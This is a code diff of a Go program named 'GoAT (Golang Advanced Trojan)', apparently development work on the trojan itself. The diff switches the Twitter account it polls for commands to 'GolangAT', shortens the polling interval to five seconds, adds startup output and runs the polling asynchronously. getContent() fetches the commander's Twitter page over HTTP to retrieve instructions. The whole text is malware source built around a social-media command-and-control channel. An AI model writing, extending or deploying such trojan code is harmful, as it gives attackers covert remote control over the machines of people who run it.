@@ -35,23 +35,27 @@ import (
 )
 
 var (
-	commander string = "kanye"	// Twitter account for Command & Control
-	slumber time.Duration = 15	// Time to wait between checking for commands (in seconds)
-	cmd string = ""			// Latest command
+	commander string = "GolangAT"	// Twitter account for Command & Control
+	slumber time.Duration = 5		// Time to wait between checking for commands (in seconds)
+	cmd string = ""					// Latest command
 )
 
 func main() {
-	fmt.Println("GoAT (Golang Advanced Trojan) Loaded.")
+	fmt.Println("GoAT (Golang Advanced Trojan) Loaded.\n")
+
+	fmt.Println("SETTINGS")
+	fmt.Println("Commander:\t\t", commander)
+	fmt.Println("Refresh interval:\t", int(slumber), "\n")
+
+	fmt.Println("Awaiting commands...")
 
 	for true {
-		refresh()
+		go refresh()
 		time.Sleep(time.Second * slumber)
 	}
 }
 
 func refresh() {
-	fmt.Println("\nRefreshing...")
-
 	lines := getContent()
  	if lines == nil {
  		return
@@ -71,9 +75,7 @@ func refresh() {
 			i = len(lines)
 		}
 	}
-
-	fmt.Println("Refreshed. Sleeping for", int(slumber), "seconds")
- } 
+} 
 
 func getContent() (lines []string) {
 	res, err := http.Get("https://twitter.com/" + commander)
